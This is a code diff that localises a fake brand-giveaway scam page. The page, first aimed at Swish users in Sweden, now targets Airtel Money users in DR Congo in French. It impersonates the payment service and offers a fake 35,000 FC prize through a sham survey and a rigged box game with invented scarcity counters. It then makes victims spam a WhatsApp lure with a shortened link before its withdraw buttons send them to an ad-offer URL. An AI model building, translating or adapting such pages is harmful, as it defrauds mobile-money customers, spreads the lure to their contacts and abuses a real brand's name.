@@ -2,7 +2,7 @@
 <html lang="en" dir="ltr">
   
 <head>
-<title>Swish 14th Anniversary </title>
+<title>14e anniversaire d'Airtel Money </title>
 <meta property="og:image" content="" /><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -302,23 +302,23 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Félicitations ! Vos réponses ont été enregistrées.</h2>
  
 <p class="paragraph">
-Now you have a chance to win 300 kr cash prize<br><br>
-You have 3 chances ! we wish you good luck
+Vous avez maintenant une chance de gagner un prix en espèces de 35 000 FC.<br><br>
+Vous avez 3 chances ! Nous vous souhaitons bonne chance.
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Vous devez sélectionner la boîte qui contient le cadeau parmi les boîtes.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Commencer
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">La case est vide, réessayez.</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Vous avez (2) chances supplémentaires. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -326,12 +326,12 @@ OK
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
-<img src="https://banknotenews.com/wp-content/uploads/2024/01/Sweden_RIK_100_kronor_2014.00.00_BNL_P71_B_230268616_f.jpg" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<img src="https://banknotenews.com/wp-content/uploads/2022/08/Congo_Democratic_Republic_BCC_10000_francs_2022.01.04_B325d_P103_S_8112634_M_f.jpg" style="width: 240px;">
+<h1 class="heading heading--h1">Félicitations! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> 300 kr Cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Votre prix est : <b> 35 000 FC</b><br>Suivez les instructions figurant sur la page suivante pour réclamer votre prix !
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -346,14 +346,14 @@ Ok
 </div>
 
 
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwwzglcADAOQ6fANsNvY_t1XXopoUv_Ge8yJC3KiTxVjRE9SF1Dn8zYqcDb9MKjkbrQ-A4YbJYRyJAzgcT6drqqeXGsxHc2adw-3Q-3qYHeszpyffMiv_gF2nM1w9VokamurFZd9QSc819bMA_AZiJ_nEf-MftazZQwrERIvmdjSmhRbAxubcIXdsrPpM8/s1672/Swish%20Sweden%2014th%20Anniversary%20Celebration.png" style="width:100%;" />
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjj3Qyf4G7VGgY6KFrlvXpIeFf-Uu6w0XQMl2FGwD4-O1A6TfRho1R_sWes1WjB-c6iveODg-oU6fOXBm0B71Elk1B9JvdYEEo6zcelqxe6xrTBdAUVL9i8LTMQoceAxronEQZNr4OMLBE0urPFvMEP0rrzHYqK4shH-gkRhtMh9BmnHDseSSyrcT7MzEs/s1983/Airtel%20Money%20Logo%20on%20White.png" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+Bonjour!
 </h1>
   <p class="paragraph">
-Welcome, <b>ENJOY 300 kr Swish Anniversary Gift To All Our Customers</b>, in celebration of our 14th Anniversary we are giving out 300 kr to Swish Users.
+Bienvenue, <b>Profitez du cadeau d'anniversaire Airtel Money de 35 000 FC offert à tous nos clients.</b>, Pour célébrer notre 14e anniversaire, nous offrons 35 000 FC aux utilisateurs d'Airtel Money.
 <br>
-Answer the questions below to claim <b>300 kr Cash Prize</b>
+Répondez aux questions ci-dessous pour réclamer un prix en espèces de 35 000 FC.</b>
 </p>
   <br>
 </div>
@@ -363,83 +363,83 @@ Answer the questions below to claim <b>300 kr Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "Veuillez patienter un instant....",
+              "Veuillez patienter un instant....",
+              "Veuillez patienter un instant...."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Vous avez répondu à 4 questions sur 4.
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+Vos réponses sont en cours de traitement.
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+Il reste encore des prix !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+À la recherche de cadeaux... 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (2265) gifts remain!
+Il ne reste que (2265) cadeaux !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+Les stocks sont en cours de vérification.
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a Using Swish?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Utilisez-vous Airtel Money ?",
+              answers: [ { text: "Oui" }, { text: "Non" } ]
             },
                                                              {
-              title: "Rate Swish Service?",
-              answers: [ { text: "Good" }, { text: "Poor" } ]
+              title: "Comment évaluez-vous le service Airtel Money ?",
+              answers: [ { text: "Bien" }, { text: "Pauvre" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Choisissez votre genre ?",
+              answers: [ { text: "Mâle" }, { text: "Femelle" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
+              title: "Sélectionnez votre tranche dâge ?",
+              answers: [ { text: "18 - 20 ans" }, { text: "21 - 25ans" }, { text: "26 - 30 ans" }, { text: "Plus de 30 ans" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
 
-       <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3c8bRj4QbXISL1ixs0yUilhog6Rx7F9HICOvZ3RSPNQwrKgfO9ETgeknI2O6PUYAjqBI8pZPxohmb49t83C1luvPZr3FXLrHkv4AYtdAqs76DCM0tlh_WvMYU8FTimzpEMdyi-ylPCKm5SBgpuooO0fTnBTQINwVcn834DXAYHzKhcaum7LmPsHZGxy4q/s1254/c3413c84-1e8d-4c32-a761-8d6e35c443ee.png" style="width:100%;" />
+       <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxeQqQQveY14IsxLgKpi1srfGnHFRnnflIN7k8IfxlWS9S6NdNO99uxdotbfUq9g7Hl92WaPcVeO_DB00ZWVhIrk5mBizuewUDjQV5YRmTpf-UaYhMt65BOQi1W37OXHreEd7-u6MOYnwF78cF5yNoZNm6QfM1waXVO0D7Sf7wB8eND1_RM2MFHk1NGfI/s1254/Airtel%20Money%2014%C3%A8me%20Anniversaire%20en%20RDC.png" style="width:100%;" />
   </div>
       </div>
   
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwwzglcADAOQ6fANsNvY_t1XXopoUv_Ge8yJC3KiTxVjRE9SF1Dn8zYqcDb9MKjkbrQ-A4YbJYRyJAzgcT6drqqeXGsxHc2adw-3Q-3qYHeszpyffMiv_gF2nM1w9VokamurFZd9QSc819bMA_AZiJ_nEf-MftazZQwrERIvmdjSmhRbAxubcIXdsrPpM8/s1672/Swish%20Sweden%2014th%20Anniversary%20Celebration.png" width='81%'/> </center>
+                                <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjj3Qyf4G7VGgY6KFrlvXpIeFf-Uu6w0XQMl2FGwD4-O1A6TfRho1R_sWes1WjB-c6iveODg-oU6fOXBm0B71Elk1B9JvdYEEo6zcelqxe6xrTBdAUVL9i8LTMQoceAxronEQZNr4OMLBE0urPFvMEP0rrzHYqK4shH-gkRhtMh9BmnHDseSSyrcT7MzEs/s1983/Airtel%20Money%20Logo%20on%20White.png" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>300 kr</b> <br>Follow the instructions below to claim your prize !</p>
+<p class="txt1">Votre prix est : <b>35,000FC</b> <br>Suivez les instructions ci-dessous pour réclamer votre prix. !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Account Number" to creditted within 2mins.</p></div>
+<div id="lastapp"><p class="rules">1. Partagez avec 5 groupes / 15 amis sur WhatsApp (cliquez sur l'icône WhatsApp ci-dessous)</p><p class="rules">2. Cliquez sur « Numéro de compte » pour être crédité dans les 2 minutes.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+  <h4 class="textlastup">Partagez jusqu'à ce que la barre bleue soit pleine.!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -450,11 +450,11 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                               Account Number
+                               Numéro de compte
                             </div>
    
   </div></div>
-  <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3c8bRj4QbXISL1ixs0yUilhog6Rx7F9HICOvZ3RSPNQwrKgfO9ETgeknI2O6PUYAjqBI8pZPxohmb49t83C1luvPZr3FXLrHkv4AYtdAqs76DCM0tlh_WvMYU8FTimzpEMdyi-ylPCKm5SBgpuooO0fTnBTQINwVcn834DXAYHzKhcaum7LmPsHZGxy4q/s1254/c3413c84-1e8d-4c32-a761-8d6e35c443ee.png" style="width:100%;" />
+  <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxeQqQQveY14IsxLgKpi1srfGnHFRnnflIN7k8IfxlWS9S6NdNO99uxdotbfUq9g7Hl92WaPcVeO_DB00ZWVhIrk5mBizuewUDjQV5YRmTpf-UaYhMt65BOQi1W37OXHreEd7-u6MOYnwF78cF5yNoZNm6QfM1waXVO0D7Sf7wB8eND1_RM2MFHk1NGfI/s1254/Airtel%20Money%2014%C3%A8me%20Anniversaire%20en%20RDC.png" style="width:100%;" />
   </div>
  
   
@@ -463,37 +463,37 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://media.istockphoto.com/id/667156006/vector/istockphoto-667156006-612x6126ee86ee8.jpg?s=612x612&amp;w=0&amp;k=20&amp;c=IGJwSeo_NSH3pMFSZyaTQe4s2FOW6Mv8sXah1_fZG00=" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>300 kr cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Votre prix est : <b>35,000FC cash.</b> <br>Suivez les instructions ci-dessous pour réclamer votre prix. !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://uplcm.com/4/6993302')" href="https://uplcm.com/4/6993302" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">WITHDRAW 300kr</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Retirer 35 000 FC</font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHOOSE BANK</div><br/> <br/>
+      <div class="share_main_bt" id="offer">CHOISIR LA BANQUE</div><br/> <br/>
 
 	     <a  onclick="window.open('https://uplcm.com/4/6993302')" href="https://uplcm.com/4/6993302" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">ACCEPT REWARD</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Accepter la récompense</font></button>
                     </a><br/> <br/>
  <a  onclick="window.open('https://uplcm.com/4/6993302')" href="https://uplcm.com/4/6993302" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CHECK PAYMENT STAUTS</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Vérifier le statut du paiement</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">CLAIM 300kr</div> 
+            <div class="share_main_bt" id="offers">CLAIM 35,000FC</div> 
       <br>
           
        
  
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3c8bRj4QbXISL1ixs0yUilhog6Rx7F9HICOvZ3RSPNQwrKgfO9ETgeknI2O6PUYAjqBI8pZPxohmb49t83C1luvPZr3FXLrHkv4AYtdAqs76DCM0tlh_WvMYU8FTimzpEMdyi-ylPCKm5SBgpuooO0fTnBTQINwVcn834DXAYHzKhcaum7LmPsHZGxy4q/s1254/c3413c84-1e8d-4c32-a761-8d6e35c443ee.png" style="width:100%;" /><br/>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxeQqQQveY14IsxLgKpi1srfGnHFRnnflIN7k8IfxlWS9S6NdNO99uxdotbfUq9g7Hl92WaPcVeO_DB00ZWVhIrk5mBizuewUDjQV5YRmTpf-UaYhMt65BOQi1W37OXHreEd7-u6MOYnwF78cF5yNoZNm6QfM1waXVO0D7Sf7wB8eND1_RM2MFHk1NGfI/s1254/Airtel%20Money%2014%C3%A8me%20Anniversaire%20en%20RDC.png" style="width:100%;" /><br/>
     
 
 
@@ -541,10 +541,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "*Are you using Swish?*%0A%0A*Get 300kr Swish 14th Anniversary Celebrration Gift To All Swish User*%0AVisit the link below to receive 300kr instantly.%0Ai just got mine%0A%0AClick Here👇%0Ahttps://sutlnk.ink/Swish-14th-Anniversary",
-   "*Are you using Swish?*%0A%0A*Get 300kr Swish 14th Anniversary Celebrration Gift To All Swish User*%0AVisit the link below to receive 300kr instantly.%0Ai just got mine%0A%0AClick Here👇%0Ahttps://sutlnk.ink/Swish-14th-Anniversary",
-    "*Are you using Swish?*%0A%0A*Get 300kr Swish 14th Anniversary Celebrration Gift To All Swish User*%0AVisit the link below to receive 300kr instantly.%0Ai just got mine%0A%0AClick Here👇%0Ahttps://sutlnk.ink/Swish-14th-Anniversary",
-   "*Are you using Swish?*%0A%0A*Get 300kr Swish 14th Anniversary Celebrration Gift To All Swish User*%0AVisit the link below to receive 300kr instantly.%0Ai just got mine%0A%0AClick Here👇%0Ahttps://sutlnk.ink/Swish-14th-Anniversary",
+    "*Utilisez-vous Airtel Money ?*%0A%0A*Recevez 35 000 FC : le cadeau de célébration du 14e anniversaire d'Airtel Money pour tous les utilisateurs.*%0AVisitez le lien ci-dessous pour recevoir 35 000 FC instantanément.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/Airtel Money-14th-Anniversary",
+   "*Utilisez-vous Airtel Money ?*%0A%0A*Recevez 35 000 FC : le cadeau de célébration du 14e anniversaire d'Airtel Money pour tous les utilisateurs.*%0AVisitez le lien ci-dessous pour recevoir 35 000 FC instantanément.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/Airtel Money-14th-Anniversary",
+    "*Utilisez-vous Airtel Money ?*%0A%0A*Recevez 35 000 FC : le cadeau de célébration du 14e anniversaire d'Airtel Money pour tous les utilisateurs.*%0AVisitez le lien ci-dessous pour recevoir 35 000 FC instantanément.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/Airtel Money-14th-Anniversary",
+   "*Utilisez-vous Airtel Money ?*%0A%0A*Recevez 35 000 FC : le cadeau de célébration du 14e anniversaire d'Airtel Money pour tous les utilisateurs.*%0AVisitez le lien ci-dessous pour recevoir 35 000 FC instantanément.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/Airtel Money-14th-Anniversary",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -627,8 +627,8 @@ $("#offerss").click(function () {
    function tipn(){
    Swal.fire({
   icon: 'error',
-  title: 'Unfortunately...',
-  text: 'To Receive Your Prize, You have to share with friends about our event. Share until the blue bar is full!',
+  title: 'Malheureusement...',
+  text: 'Pour recevoir votre prix, vous devez parler de notre événement à vos amis. Continuez à partager jusquà ce que la barre bleue soit pleine.!',
   
 });
    }
